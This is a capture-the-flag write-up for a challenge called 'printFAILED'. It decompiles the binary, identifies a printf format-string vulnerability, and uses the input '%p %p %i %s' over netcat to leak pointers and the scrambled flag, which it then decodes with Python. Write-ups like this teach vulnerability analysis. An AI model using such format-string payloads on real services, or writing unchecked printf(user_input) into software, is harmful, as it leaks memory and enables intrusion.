# printFAILED

This challenge provided a binary file named ```printFAILED```. We can run it and it asks us the scrambled flag.
So we must provide a scrambled version of the flag to obtain the flag. To make things just a little more complicated, the flag is obtained from a file.

Opening the file in ghidra shows a simple binary with a ```main``` and a ```scramble``` functions. The scramble is very simple, consisting in adding 1 to each char.

```
void scramble(int param_1)

{
  int idx;
  
  idx = 0x0;
  while (idx < param_1) {
    flag[idx] = flag[idx] + '\x01';
    idx = idx + 0x1;
  }
  return;
}

```

The main function is also simple, and after some renaming and retyping it becomes even better:
```
int main(void)

{
  int result;
  FILE *fin;
  
  fin = fopen("flag.txt","r");
  fgets(flag,0x28,fin);
  scramble(0x27);
  puts("can you guess the scrambled flag?");
  fflush(stdout);
  fgets(guess,0x28,stdin);
  puts("you guessed: ");
  printf(guess,main,scramble,(ulong)FLAG_LEN,flag); // <--- printf Format Vuln here
  result = strcmp(guess,flag);
  if (result == 0x0) {
    puts("nice guess!");
  }
  else {
    puts("wrong");
  }
  return 0x0;
}
```

The command was added for the writeup. It explores the fact that ```printf``` first argument is the string format and not the content to be printed.
If this argument is controlled by an attacker, the attacker can has a wide range of techniques to read and write memory.

Considering the function as presented, it has 5 arguments: the format (user controlled), the main function, the scramble function, the flag length and then the scrambled flag. 

```
printf(guess,main,scramble,FLAG_LEN,flag);
```

The vulnerability allows a multitude of attacks, lets stick to the challenge. 
Providing ```%p %p %i %s``` will print 2 pointers, the length, and then the scrambled flag. If the scrambled flag has no ```0x00``` chars, it will print the entire flag.

The result is:
```
nc printf.sdc.tf 1337
can you guess the scrambled flag?
%p %p %i %s
you guessed:
0x555de903b86f 0x555de903b82a 40 tedug|E1ou`c4`5`g52mvs4`2jl4`uI2T`D1e4~
wrong
```

We failed to provide the correct content, but we have the flag. A second try will yeld a different result:
```
can you guess the scrambled flag?
tedug|E1ou`c4`5`g52mvs4`2jl4`uI2T`D1e4~
you guessed:
tedug|E1ou`c4`5`g52mvs4`2jl4`uI2T`D1e4~nice guess!
```

A python oneliner will get us the flag:
```
print(''.join([chr(x-1) for x in b'tedug|E1ou`c4`5`g52mvs4`2jl4`uI2T`D1e4~']))
sdctf{D0nt_b3_4_f41lur3_1ik3_tH1S_C0d3}
```

